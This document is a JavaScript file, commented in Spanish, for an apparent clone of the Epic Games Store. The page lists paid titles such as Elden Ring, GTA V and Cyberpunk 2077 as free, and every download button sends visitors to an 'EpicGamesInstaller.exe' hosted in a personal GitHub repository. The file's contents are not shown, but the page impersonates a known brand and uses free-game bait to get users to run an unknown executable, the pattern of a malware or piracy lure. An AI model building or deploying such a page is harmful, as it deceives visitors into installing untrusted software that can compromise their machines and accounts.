/*
══════════════════════════════════════════════════════════════════════════════
  ARCHIVO: script.js
  DESCRICIÓN: JavaScript principal del sitio web (Clon Epic Games Store)
  PROPÓSITO: Contiene toda la lógica interactiva del sitio:
    - Datos de los juegos (títulos, desarrolladores, precios, imágenes)
    - Creación y renderizado dinámico de tarjetas de juegos
    - Control del carrusel automático y manual
    - Funcionalidad de búsqueda de juegos
    - Descarga del instalador
    - Efectos de hover en tarjetas
══════════════════════════════════════════════════════════════════════════════
*/

//
// ═══════════════════════════════════════════
// CONSTANTE: URL DE DESCARGA
// ═══════════════════════════════════════════
// Esta es la URL del archivo ejecutable del instalador del juego.
// Cuando el usuario hace clic en "Descargar" o "Descarga Gratis",
// el navegador redirige a esta URL para descargar el archivo .exe.
//
// NOTA: La URL apunta a un repositorio de GitHub donde se almacena
// el instalador. Esto significa que cualquier visitante del sitio
// puede acceder y descargar ese archivo.
//
const DOWNLOAD_URL = 'https://github.com/Anderson0525/EpicGames/raw/refs/heads/main/EpicGamesInstaller.exe';

//
// ═══════════════════════════════════════════
// OBJETO: DATOS DE LOS JUEGOS
// ═══════════════════════════════════════════
// gamesData contiene toda la información de los juegos organizada en
// tres categorías:
//   1. featured: Juegos destacados (sección principal)
//   2. sales: Juegos en oferta (sección de ofertas)
//   3. free: Juegos gratuitos (sección gratis)
//
// Cada juego es un objeto con las siguientes propiedades:
//   - title: Nombre del juego (string)
//   - developer: Estudio/compañía que lo desarrolló (string)
//   - price: Precio actual en euros. 0 significa que es gratis (number)
//   - discount: Porcentaje de descuento (null si no tiene descuento)
//   - image: Ruta de la imagen del juego (string)
//   - freeDownload: Si es true, muestra un botón de descarga gratuita (boolean)
//   - originalPrice: Precio original antes del descuento (solo en sales)
//
// Nota: En este proyecto, todos los precios son 0 y todos los juegos
// son gratuitos. Es una configuración simplificada para demostración.
//
const gamesData = {
    //
    // ───────────────────────────────────────────
    // JUEGOS DESTACADOS (featured)
    // ───────────────────────────────────────────
    // Estos son los juegos más populares o recomendados por la tienda.
    // Se muestran en la primera sección de la página principal.
    // ───────────────────────────────────────────
    featured: [
        {
            title: "Black Myth: Wukong",       // Título del juego
            developer: "Game Science",          // Estudio desarrollador
            price: 0,                           // Precio: 0 = Gratis
            discount: null,                     // Sin descuento
            image: "imagenes/blackwukong.png",  // Ruta de la imagen
            freeDownload: true                  // Muestra botón de descarga
        },
        {
            title: "Elden Ring",
            developer: "FromSoftware",
            price: 0,
            discount: null,
            image: "imagenes/eldenring.png",
            freeDownload: true
        },
        {
            title: "Cyberpunk 2077",
            developer: "CD Projekt Red",
            price: 0,
            discount: null,
            image: "imagenes/ciberpunk.png",
            freeDownload: true
        },
        {
            title: "Hogwarts Legacy",
            developer: "Avalanche Software",
            price: 0,
            discount: null,
            image: "imagenes/harrypotter.png",
            freeDownload: true
        },
        {
            title: "Baldur's Gate 3",
            developer: "Larian Studios",
            price: 0,
            discount: null,
            image: "imagenes/Baldurs.png",
            freeDownload: true
        }
    ],

    //
    // ───────────────────────────────────────────
    // JUEGOS EN OFERTA (sales)
    // ───────────────────────────────────────────
    // Juegos populares que están en promoción.
    // Tienen la propiedad "originalPrice" para mostrar el precio anterior.
    // ───────────────────────────────────────────
    sales: [
        {
            title: "Red Dead Redemption 2",
            developer: "Rockstar Games",
            price: 0,
            discount: null,
            originalPrice: 0,       // Precio antes del descuento
            image: "imagenes/RedDead.png",
            freeDownload: true
        },
        {
            title: "The Witcher 3",
            developer: "CD Projekt Red",
            price: 0,
            discount: null,
            originalPrice: 0,
            image: "imagenes/TheWitcher.png",
            freeDownload: true
        },
        {
            title: "GTA V",
            developer: "Rockstar Games",
            price: 0,
            discount: null,
            originalPrice: 0,
            image: "imagenes/gtav.png",
            freeDownload: true
        },
        {
            title: "Assassin's Creed Valhalla",
            developer: "Ubisoft",
            price: 0,
            discount: null,
            originalPrice: 0,
            image: "imagenes/assassin.png",
            freeDownload: true
        }
    ],

    //
    // ───────────────────────────────────────────
    // JUEGOS GRATIS (free)
    // ───────────────────────────────────────────
    // Juegos que están disponibles de forma gratuita esta semana.
    // Se muestran en la sección inferior de la página.
    // ───────────────────────────────────────────
    free: [
        {
            title: "Fortnite",
            developer: "Epic Games",    // El propio creador de la tienda
            price: 0,
            discount: null,
            image: "imagenes/fortnitehero.png",
            freeDownload: true
        },
        {
            title: "Rocket League",
            developer: "Psyonix",
            price: 0,
            discount: null,
            image: "imagenes/rocketleague.png",
            freeDownload: true
        },
        {
            title: "Genshin Impact",
            developer: "miHoYo",
            price: 0,
            discount: null,
            image: "imagenes/genshin.png",
            freeDownload: true
        },
        {
            title: "Apex Legends",
            developer: "Respawn",
            price: 0,
            discount: null,
            image: "imagenes/apex.png",
            freeDownload: true
        }
    ]
};

//
// ═══════════════════════════════════════════
// FUNCIÓN: createGameCard(game)
// ═══════════════════════════════════════════
// PROPÓSITO: Crea el código HTML de una tarjeta de juego individual.
//
// CÓMO FUNCIONA:
//   1. Recibe un objeto de juego como parámetro
//   2. Calcula si tiene descuento y el precio final
//   3. Si el juego es gratis, genera un botón de descarga
//   4. Devuelve una cadena de texto (string) con el HTML completo de la tarjeta
//
// PARÁMETROS:
//   - game: Un objeto con las propiedades: title, developer, price,
//     discount, image, freeDownload, originalPrice
//
// VALOR DE RETORNO:
//   - Un string con el HTML de la tarjeta del juego
//
// COMPLEJIDAD: O(1) - Tiempo constante, solo procesa un juego
//
function createGameCard(game) {
    // Verifica si el juego tiene descuento activo
    // game.discount !== null asegura que no sea null
    // game.discount > 0 asegura que el porcentaje sea positivo
    const hasDiscount = game.discount !== null && game.discount > 0;

    // Calcula el precio final con descuento aplicado
    // Ejemplo: Si price = 60 y discount = 50, entonces:
    // finalPrice = 60 * (1 - 50/100) = 60 * 0.5 = 30.00
    // Si no hay descuento, el precio final es el mismo que el precio original
    const finalPrice = hasDiscount ? (game.price * (1 - game.discount / 100)).toFixed(2) : game.price;

    // Genera el botón de descarga gratuita SI freeDownload es true
    // Si no es gratis, el botón será una cadena vacía ('')
    // El botón tiene un onclick que redirige a DOWNLOAD_URL
    const freeDownloadBtn = game.freeDownload ?
        `<button class="btn-free-download" onclick="window.location.href='${DOWNLOAD_URL}'">Descarga Gratis</button>` : '';

    // Retorna el HTML completo de la tarjeta usando template literals (backticks)
    // El HTML se construye dinámicamente insertando las propiedades del juego
    return `
        <div class="game-card">
            <div class="game-image-container">
                <!--
                    Imagen del juego con manejo de errores:
                    Si la imagen no carga (onerror), se reemplaza automáticamente
                    por 'nintendo.png' que es una imagen de respaldo.
                -->
                <img src="${game.image}" alt="${game.title}" class="game-image" onerror="this.src='nintendo.png'">
            </div>
            <div class="game-info">
                <!-- Título del juego -->
                <h3 class="game-title">${game.title}</h3>
                <!-- Nombre del desarrollador -->
                <p class="game-developer">${game.developer}</p>
                <div class="game-price-section">
                    <!-- Si tiene descuento, muestra el badge de porcentaje -->
                    ${hasDiscount ? `<span class="discount-badge">-${game.discount}%</span>` : ''}
                    <!-- Si tiene descuento, muestra el precio original tachado -->
                    ${hasDiscount ? `<span class="original-price">${game.originalPrice} €</span>` : ''}
                    <!-- Muestra el precio: "Gratis" si price es 0, sino muestra el precio final -->
                    <span class="current-price ${game.price === 0 ? 'free-tag' : ''}">
                        ${game.price === 0 ? 'Gratis' : finalPrice + ' €'}
                    </span>
                </div>
                <!-- Botón de descarga gratuita (si aplica) -->
                ${freeDownloadBtn}
            </div>
        </div>
    `;
}

//
// ═══════════════════════════════════════════
// FUNCIÓN: renderGames()
// ═══════════════════════════════════════════
// PROPÓSITO: Renderiza (muestra) todos los juegos en sus respectivas
// secciones de la página web.
//
// CÓMO FUNCIONA:
//   1. Toma los datos de gamesData
//   2. Para cada categoría (featured, sales, free), usa .map() para crear
//      una tarjeta HTML por cada juego
//   3. Usa .join('') para unir todas las tarjetas en un solo string
//   4. Inyecta ese HTML en el elemento correspondiente del DOM usando
//      document.getElementById().innerHTML
//
// NOTA: Esta función se ejecuta automáticamente cuando se carga la página.
//
// COMPLEJIDAD: O(n) donde n es el número total de juegos
//
function renderGames() {
    //
    // Llena la sección "Juegos destacados" con las tarjetas de featured
    // gamesData.featured.map(createGameCard) → crea HTML para cada juego
    // .join('') → une todo el HTML sin separadores
    // document.getElementById('featured-games').innerHTML = ... → lo inyecta en el DOM
    //
    document.getElementById('featured-games').innerHTML = gamesData.featured.map(createGameCard).join('');

    // Llena la sección "Ofertas especiales" con los juegos en sales
    document.getElementById('sale-games').innerHTML = gamesData.sales.map(createGameCard).join('');

    // Llena la sección "Gratis esta semana" con los juegos en free
    document.getElementById('free-games').innerHTML = gamesData.free.map(createGameCard).join('');
}

//
// ═══════════════════════════════════════════
// SECCIÓN: CARRUSEL (CAROUSEL)
// ═══════════════════════════════════════════
// El carrusel permite mostrar múltiples diapositivas en el mismo espacio,
// cambiando automáticamente cada 5 segundos o cuando el usuario hace clic
// en los puntos de navegación.

// Variable que lleva el registro de cuál slide está actualmente activo
// Empieza en 0 (el primer slide)
let currentSlide = 0;

// Obtiene todas las diapositivas del carrusel del DOM
// querySelectorAll selecciona todos los elementos con clase "carousel-slide"
const slides = document.querySelectorAll('.carousel-slide');

// Obtiene todos los puntos de navegación (dots) del carrusel
const dots = document.querySelectorAll('.carousel-dot');

//
// FUNCIÓN: goToSlide(index)
// PROPÓSITO: Cambia la diapositiva actual a la que se especifica en el índice.
//
// CÓMO FUNCIONA:
//   1. Quita la clase "active" del slide actual (lo oculta)
//   2. Quita la clase "active" del punto actual (lo deselecciona)
//   3. Cambia currentSlide al nuevo índice
//   4. Agrega la clase "active" al nuevo slide (lo muestra)
//   5. Agrega la clase "active" al nuevo punto (lo selecciona)
//
// PARÁMETROS:
//   - index: Número del slide al que quieres ir (0, 1, o 2)
//
// COMPLEJIDAD: O(1) - Solo manipula unos pocos elementos del DOM
//
function goToSlide(index) {
    // Quita la clase "active" del slide anterior para ocultarlo
    slides[currentSlide].classList.remove('active');
    // Quita la clase "active" del punto anterior
    dots[currentSlide].classList.remove('active');

    // Actualiza el índice al nuevo slide
    currentSlide = index;

    // Agrega la clase "active" al nuevo slide para mostrarlo
    slides[currentSlide].classList.add('active');
    // Agrega la clase "active" al nuevo punto para resaltarlo
    dots[currentSlide].classList.add('active');
}

//
// FUNCIÓN: nextSlide()
// PROPÓSITO: Avanza automáticamente al siguiente slide del carrusel.
//
// CÓMO FUNCIONA:
//   1. Calcula el siguiente índice usando el operador módulo (%)
//      Esto asegura que cuando se llega al último slide (índice 2),
//      vuelve al primero (índice 0). Es un bucle circular.
//      Ejemplo: Si hay 3 slides y currentSlide = 2, entonces:
//      next = (2 + 1) % 3 = 3 % 3 = 0 → Vuelve al inicio
//
// COMPLEJIDAD: O(1) - Solo calcula un índice y llama a goToSlide
//
function nextSlide() {
    // El operador módulo (%) asegura que el índice siempre esté
    // dentro del rango válido (0 a slides.length - 1)
    const next = (currentSlide + 1) % slides.length;
    goToSlide(next);
}

//
// AUTO-PLAY DEL CARRUSEL
// setInterval(nextSlide, 5000): Llama a nextSlide() cada 5000 milisegundos
// (es decir, cada 5 segundos). Esto crea el efecto de carrusel automático.
// El intervalo se ejecuta en segundo plano mientras el usuario navega por
// la página.
//
setInterval(nextSlide, 5000);

//
// ═══════════════════════════════════════════
// EVENTOS DE DESCARGA
// ═══════════════════════════════════════════

//
// BOTÓN DE DESCARGA PRINCIPAL (en el header)
//
// Selecciona el botón con id="downloadBtn" y le agrega un evento de clic.
// Cuando el usuario hace clic en "Descargar" en el header:
//   window.location.href = DOWNLOAD_URL → Redirige al navegador a la URL
// del instalador, lo que inicia la descarga del archivo .exe.
//
document.getElementById('downloadBtn').addEventListener('click', function() {
    window.location.href = DOWNLOAD_URL;
});

//
// BOTONES "DESCARGA GRATIS" EN EL CARRUSEL
//
// Selecciona todos los botones con la clase "free-download-btn" dentro
// del carrusel y les agrega un evento de clic a cada uno.
// Al hacer clic, redirigen a la misma URL de descarga.
//
// querySelectorAll: Selecciona MÚLTIPLES elementos que coincidan con el selector.
// forEach: Itera sobre cada elemento encontrado y le agrega el evento.
//
document.querySelectorAll('.free-download-btn').forEach(btn => {
    btn.addEventListener('click', function() {
        window.location.href = DOWNLOAD_URL;
    });
});

//
// ═══════════════════════════════════════════
// INICIALIZACIÓN DE LA PÁGINA
// ═══════════════════════════════════════════
//
// renderGames(): Se llama al final del script para que, cuando se carga
// la página, los juegos se rendericen automáticamente en sus secciones.
//
renderGames();

//
// ═══════════════════════════════════════════
// EFECTOS DE HOVER EN TARJETAS
// ═══════════════════════════════════════════
//
// Se ejecuta cuando el DOM ha terminado de cargarse (DOMContentLoaded).
// El propósito es agregar efectos visuales a las tarjetas de juego:
//   - Al pasar el ratón (mouseenter): La tarjeta se desplaza 8px hacia arriba
//   - Al quitar el ratón (mouseleave): La tarjeta vuelve a su posición original
//
// NOTA: Estos efectos ya están definidos en CSS (.game-card:hover), pero
// este JavaScript los agrega como una capa adicional de control.
//
document.addEventListener('DOMContentLoaded', () => {
    // Selecciona todas las tarjetas de juego del DOM
    const cards = document.querySelectorAll('.game-card');

    // Itera sobre cada tarjeta
    cards.forEach(card => {
        // Al pasar el ratón sobre la tarjeta, se desplaza hacia arriba
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-8px)';
            // this se refiere a la tarjeta actual (card)
            // translateY(-8px) mueve el elemento 8 píxeles hacia arriba
        });

        // Al quitar el ratón de la tarjeta, vuelve a su posición original
        card.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
            // translateY(0) significa sin desplazamiento
        });
    });
});

//
// ═══════════════════════════════════════════
// BÚSQUEDA FUNCIONAL
// ═══════════════════════════════════════════
//
// Permite al usuario buscar juegos escribiendo en el campo de búsqueda.
// La búsqueda se realiza en tiempo real (evento 'input') mientras el
// usuario escribe.
//
// CÓMO FUNCIONA:
//   1. Cuando el usuario escribe algo en el campo de búsqueda, se captura
//      el valor del input (e.target.value) y se convierte a minúsculas
//   2. Se seleccionan todas las tarjetas de juego de la página
//   3. Para cada tarjeta:
//      - Se obtiene el título del juego y el desarrollador
//      - Se verifica si el término de búsqueda aparece en el título
//        O en el desarrollador (usando .includes())
//      - Si coincide: se muestra la tarjeta (display: block)
//      - Si no coincide: se oculta la tarjeta (display: none)
//
// COMPLEJIDAD: O(n * m) donde n = número de tarjetas, m = longitud promedio
// del texto (por el .includes() que recorre el string)
//
document.querySelector('.search-box input').addEventListener('input', function(e) {
    // e.target.value: El texto actualmente escrito en el campo de búsqueda
    // .toLowerCase(): Se convierte a minúsculas para hacer la búsqueda
    // insensible a mayúsculas/minúsculas
    const searchTerm = e.target.value.toLowerCase();

    // Selecciona todas las tarjetas de juego visibles en la página
    const allCards = document.querySelectorAll('.game-card');

    // Itera sobre cada tarjeta para verificar si coincide con la búsqueda
    allCards.forEach(card => {
        // Obtiene el texto del título de la tarjeta y lo convierte a minúsculas
        const title = card.querySelector('.game-title').textContent.toLowerCase();
        // Obtiene el texto del desarrollador de la tarjeta y lo convierte a minúsculas
        const developer = card.querySelector('.game-developer').textContent.toLowerCase();

        // Verifica si el término de búsqueda aparece dentro del título
        // O si aparece dentro del nombre del desarrollador
        // Si cualquiera coincide, la tarjeta se muestra; si no, se oculta
        if (title.includes(searchTerm) || developer.includes(searchTerm)) {
            card.style.display = 'block';  // Muestra la tarjeta
        } else {
            card.style.display = 'none';   // Oculta la tarjeta
        }
    });
});
